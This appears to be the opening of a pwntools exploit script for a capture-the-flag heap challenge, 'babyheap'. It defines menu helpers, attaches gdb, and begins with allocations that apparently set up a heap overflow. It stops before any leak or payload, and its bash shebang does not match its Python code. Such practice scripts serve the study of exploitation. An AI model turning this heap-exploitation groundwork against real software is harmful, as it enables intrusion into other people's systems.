#!/bin/bash
from pwn import *
import sys

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

# libc.so.6 is libc-2.23.so
# the same as my env

if len(sys.argv)>1:
    io = remote("127.0.0.1", 1234)
else:
    io = process("./babyheap")

def menu(ix):
    io.sendlineafter("choice: ", str(ix))

def alloc(size, content):
    menu(1)
    io.sendlineafter("size: ", str(size))
    io.sendafter("content: ", content)

def show(ix):
    menu(2)
    io.sendlineafter("index: ", str(ix))

def delete(ix):
    menu(3)
    io.sendlineafter("index: ", str(ix))

gdb.attach(io, "b *%d\nc\n"%(0x555555554000+0x117E))
alloc(0x18, "A"*0x17)
alloc(0x18, "B"*0x18 )
